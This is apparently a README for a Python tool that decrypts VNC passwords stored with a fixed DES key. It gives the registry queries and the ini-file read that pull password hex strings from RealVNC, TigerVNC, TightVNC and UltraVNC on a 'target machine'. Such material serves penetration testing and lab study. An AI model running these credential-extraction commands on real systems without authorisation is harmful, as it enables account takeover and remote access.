# vnc-decryptor
Python script to decrypt VNC passwords extracted from Windows Registry using fixed DES key

##🔍 VNC Hex String Storage Locations
1. RealVNC
-Usually stored at the system level in the Registry.
```cmd
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver /v Password
```

2. TigerVNC
-Stored in the Registry, typically located in the Current User configuration.
```cmd
reg query HKEY_CURRENT_USER\Software\TigerVNC\WinVNC4 /v Password
```

3. TightVNC
-Very common in lab environments. The password can be stored in HKCU or HKLM. There are usually two values: Password (full access) and ControlPassword (view only).
```cmd
reg query HKEY_CURRENT_USER\Software\TightVNC\Server /v Password
reg query HKEY_LOCAL_MACHINE\Software\TightVNC\Server /v Password
```

4. UltraVNC
-Not stored in the Registry; configuration is saved in an .ini file. You must read the contents of this file on the target machine.
-You will find the line passwd=HEX_STRING or passwd2=HEX_STRING.
```cmd
type "C:\Program Files\UltraVNC\ultravnc.ini"
```


##🚀 Usage Instructions

Step 1: Install the required cryptography library. This script requires pycryptodome.
```bash
pip install pycryptodome
```

Step 2: Open the vnc_decrypt.py file and paste the hex string collected from the target machine into the hex_password variable.

Step 3: Run the script to decrypt:
```bash
python3 vnc_decrypt.py
```
